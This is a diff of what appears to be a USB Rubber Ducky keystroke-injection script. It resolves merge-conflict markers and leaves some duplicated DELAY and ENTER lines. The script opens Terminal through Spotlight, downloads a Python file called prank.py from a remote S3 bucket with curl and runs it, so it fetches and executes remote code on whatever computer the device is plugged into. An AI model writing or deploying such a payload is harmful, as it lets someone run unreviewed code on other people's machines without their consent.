@@ -6,18 +6,12 @@ DELAY 1000
 GUI SPACE
 STRING Terminal
 ENTER
-<<<<<<< HEAD
 DELAY 2000
-=======
 DELAY 1000
->>>>>>> 9b4f3fabb5e773182a3c6444480509eebcb1a770
 STRING curl https://s3-us-west-2.amazonaws.com/remoteduck/prank.py -o prank.py
 ENTER
 DELAY 1000
 STRING python prank.py
 DELAY 1000
-<<<<<<< HEAD
 ENTER
-=======
 ENTER
->>>>>>> 9b4f3fabb5e773182a3c6444480509eebcb1a770
